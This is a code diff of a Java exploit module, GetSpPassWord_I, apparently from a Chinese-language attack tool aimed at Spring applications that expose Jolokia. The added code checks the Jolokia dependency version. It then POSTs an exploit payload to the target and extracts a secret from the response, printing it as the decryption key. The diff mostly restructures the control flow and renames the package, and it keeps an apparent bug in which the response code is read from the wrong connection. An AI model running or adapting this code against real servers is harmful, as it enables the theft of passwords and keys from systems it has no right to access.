@@ -1,4 +1,4 @@
-package src.main.vul;
+package src.main.module;
 
 import src.main.impl.ResultCallback;
 
@@ -247,41 +247,43 @@ public class GetSpPassWord_I {
                 String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                 Pattern pattern = Pattern.compile(regex);
                 Matcher matcher = pattern.matcher(response.toString());
-                if(matcher.find()){
-                    text = String.format("jolokia依赖为: %s",matcher.group(1));
-                    callback.onResult(text);                }
-                URL obj1 = new URL(site);
-                HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                conn1.setRequestMethod("POST");
-                conn1.setRequestProperty("Content-Type", "application/json");
-                conn1.setDoOutput(true);
-                try(OutputStream os = conn1.getOutputStream()){
-                    byte[] input  = expdata.getBytes(StandardCharsets.UTF_8);
-                    os.write(input,0,input.length);
-                }
-                int responseCode1 = conn.getResponseCode();
-                if (responseCode1 == HttpURLConnection.HTTP_OK){
-                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
-                    String inputLine1;
-                    StringBuilder response1 = new StringBuilder();
-                    while ((inputLine1 = in1.readLine()) != null) {
-                        response1.append(inputLine1);
+                if(matcher.find()) {
+                    text = String.format("jolokia依赖为: %s", matcher.group(1));
+                    callback.onResult(text);
+                    URL obj1 = new URL(site);
+                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    conn1.setRequestMethod("POST");
+                    conn1.setRequestProperty("Content-Type", "application/json");
+                    conn1.setDoOutput(true);
+                    try (OutputStream os = conn1.getOutputStream()) {
+                        byte[] input = expdata.getBytes(StandardCharsets.UTF_8);
+                        os.write(input, 0, input.length);
                     }
-                    in1.close();
-                    if (response1.toString().contains(respValue)){
-                        String regex1 = "\"value\":\"([^\"]+)\"";
-                        Pattern pattern1 = Pattern.compile(regex1);
-                        Matcher matcher1 = pattern1.matcher(response1.toString());
-                        if(matcher1.find()){
-                            text = args + " " + "解密密钥为: " + matcher1.group(1);
-                            callback.onResult(text);
+                    int responseCode1 = conn.getResponseCode();
+                    if (responseCode1 == HttpURLConnection.HTTP_OK) {
+                        BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
+                        String inputLine1;
+                        StringBuilder response1 = new StringBuilder();
+                        while ((inputLine1 = in1.readLine()) != null) {
+                            response1.append(inputLine1);
                         }
+                        in1.close();
+                        if (response1.toString().contains(respValue)) {
+                            String regex1 = "\"value\":\"([^\"]+)\"";
+                            Pattern pattern1 = Pattern.compile(regex1);
+                            Matcher matcher1 = pattern1.matcher(response1.toString());
+                            if (matcher1.find()) {
+                                text = args + " " + "解密密钥为: " + matcher1.group(1);
+                                callback.onResult(text);
+                            }
+                        }
+                    } else {
+                        callback.onResult("网络连接错误");
                     }
                 }else{
-                    callback.onResult("网络连接错误");
+                    text = "未找到依赖";
+                    callback.onResult(text);
                 }
-            }else{
-                callback.onResult("没有发现jolokia");
             }
             in.close();
         }catch (Exception e) {
